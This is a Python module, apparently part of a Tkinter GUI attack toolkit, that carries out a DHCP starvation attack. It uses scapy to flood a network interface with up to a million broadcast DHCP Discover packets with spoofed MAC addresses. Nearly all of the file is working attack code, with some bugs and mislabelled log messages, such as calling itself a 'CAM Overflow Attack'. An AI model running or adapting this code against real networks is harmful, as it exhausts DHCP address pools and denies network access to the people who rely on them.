# DHCP Starvation Attack

import random
import string
from time import sleep
from scapy.sendrecv import sendp, sniff
from scapy.layers.l2 import Ether
from scapy.all import RandMAC
from scapy.layers.inet import IP
from scapy.layers.inet import UDP 
from scapy.layers.dhcp import BOOTP, DHCP
import threading
import traceback

from tkinter import *

def startDhcp(interface, terminalContentFrame, errorOutputContentFrame, colorConfig = "#252525") :
    global dhcpThreads, terminalLabel, errorOutputLabel

    dhcpThreads = threading.Thread(target = lambda : startDhcpStarvation(interface))

    terminalLabel = Label(terminalContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
    errorOutputLabel = Label(errorOutputContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
    terminalLabel.configure(bg = colorConfig) 
    errorOutputLabel.configure(bg = colorConfig)

    terminalLabel["text"] += "$ Target Interface = " + interface + "\n"
    terminalLabel["text"] += "$ Running CAM Overflow Attack...\n"

    runDhcpAttack()

    terminalLabel.pack(anchor = NW)
    errorOutputLabel.pack(anchor = NW)

def stopDhcp() :
    global dhcpThreads, sendPacketsThread

    try:
        terminalLabel["text"] += "$ Stopping DHCP Table Attack...\n"

        dhcpThreads.join(0)
        dhcpThreads = None
        sendPacketsThread.join(0)
        sendPacketsThread = None

        terminalLabel["text"] += "$ DHCP Table Attack successfully stopped!\n"
    except (AttributeError, RuntimeError):
        errorOutputLabel["text"] += traceback.format_exc()
    except Exception as e:
        errorOutputLabel["text"] += "ERROR : \n" + e + "\n"

def stopDhcpChain(chainTerminalContentFrame, chainErrorContentFrame) :
    chainTerminalLabel = Label(chainTerminalContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=278)
    chainErrorOutputLabel = Label(chainErrorContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=278)
    chainTerminalLabel.pack(anchor = NW)
    chainErrorOutputLabel.pack(anchor = NW)
    
    try:
        chainTerminalLabel["text"] += "$ Stopping DHCP Table Attack...\n"


        chainTerminalLabel["text"] += "$ DHCP Table Attack successfully stopped!\n"
    except (AttributeError, RuntimeError):
        chainErrorOutputLabel["text"] += traceback.format_exc()
    except Exception as e:
        chainErrorOutputLabel["text"] += "ERROR : \n" + e + "\n"

def runDhcpAttack() :
    global dhcpThreads
    dhcpThreads.start()

def startDhcpStarvation(interface):
    global sendPacketsThread
    
    dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff',src=RandMAC())  \
                     /IP(src='0.0.0.0',dst='255.255.255.255') \
                     /UDP(sport=68,dport=67) \
                     /BOOTP(op=1,chaddr = RandMAC()) \
                     /DHCP(options=[('message-type','discover'),('end')])
    
    terminalLabel["text"] += "$ Sending DHCP Packets...\n"
    sendPacketsThread = threading.Thread(sendp(dhcp_discover,iface=interface,count=1000000,verbose=1))
    try :
        sendPacketsThread.start()
    except Exception as e :
        errorOutputLabel["text"] += "ERROR : \n" + str(e) + "\n"
